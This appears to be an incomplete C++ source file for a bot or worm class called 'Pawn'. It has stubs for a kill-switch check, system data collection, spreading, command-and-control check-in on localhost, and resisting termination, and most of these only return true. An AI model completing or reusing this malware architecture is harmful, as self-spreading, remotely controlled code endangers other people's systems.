//
// Created by nn5h on 7/23/19.
//

#include <unistd.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include "Pawn.h"



bool Pawn::sendMySelfData() {

    return true;
}

bool Pawn::checkSWKill() {
    /* TEMPORARY
     * looking for parent
     * if it is, don't create clones */

    std::string url = "localhost:65501";
    auto resp = myget(url);

    return resp.status_code == 200;
}

//int Pawn::readPidFile(std::string fname) {
//    std::ifstream fs(fname);
//
//    if (fs.fail()) return -1;
//
//    std::string line;
//    fs >> line;
//    int gotPid = std::stoi(line);
//    printf("Got %d\n", gotPid);
//    fs.close();
//
//    return gotPid;
//
//}

bool Pawn::spread() {
    return true;
}

void Pawn::doWork() {
    for (int i = 0; i < 100; i++) {
        std::cout << i << " step" << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

Pawn::Pawn() {
    if (!checkSWKill()) {
        systemData = SystemDataCollector();
        bool sendSystemDataResult = sendMySelfData();
        bool spreadResult = spread();
        doWork();
    }


}

Pawn::~Pawn() { }


bool Pawn::connect2CC() {
    std::string CCIP = "127.0.0.1";
    std::string CCPort = "13131";

    std::map<std::string, std::string> dataQuickCheck;
    dataQuickCheck.insert(std::pair<std::string, std::string>("world", "1111"));

    int connectCheckResult = mypost(CCIP+CCPort+"/hello", dataQuickCheck);

    return (bool)connectCheckResult;
}

bool Pawn::sendData2IP() {
    return true;
}

void preventKill() {
    // monitor sent signals
}